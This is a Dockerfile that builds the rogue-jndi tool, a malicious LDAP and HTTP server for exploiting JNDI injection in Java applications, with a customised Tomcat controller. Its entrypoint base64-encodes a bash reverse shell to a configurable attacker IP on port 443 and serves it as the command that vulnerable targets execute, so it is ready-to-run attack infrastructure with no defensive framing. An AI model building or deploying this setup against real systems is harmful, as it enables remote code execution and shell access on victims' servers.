FROM maven as builder

RUN git clone https://github.com/veracode-research/rogue-jndi \
    && mkdir /usr/src/app \
    && cp -avr rogue-jndi/src /usr/src/app/src \
    && cp -av rogue-jndi/pom.xml /usr/src/app
COPY main/java/artsploit/controllers/Tomcat.java /usr/src/app/src/main/java/artsploit/controllers/Tomcat.java
COPY main/java/artsploit/Utilities.java /usr/src/app/src/main/java/artsploit/Utilities.java
    ##### Compile rogue-jndi #####
RUN mvn -f /usr/src/app/pom.xml clean package -DskipTests

FROM openjdk:8-alpine
COPY --from=builder /usr/src/app/target/RogueJndi-1.1.jar /usr/app/RogueJndi-1.1.jar

ARG PAYLOAD_IP=127.0.0.1
ENV PAYLOAD_IP=${PAYLOAD_IP}

EXPOSE 1389 8888

ENTRYPOINT b64=$(echo "bash -i >& /dev/tcp/${PAYLOAD_IP}/443 0>&1" | base64); java -jar /usr/app/RogueJndi-1.1.jar -l 1389 -p 8888 -c "bash -c {echo,$b64}|{base64,-d}|{bash,-i}" -n "${PAYLOAD_IP}"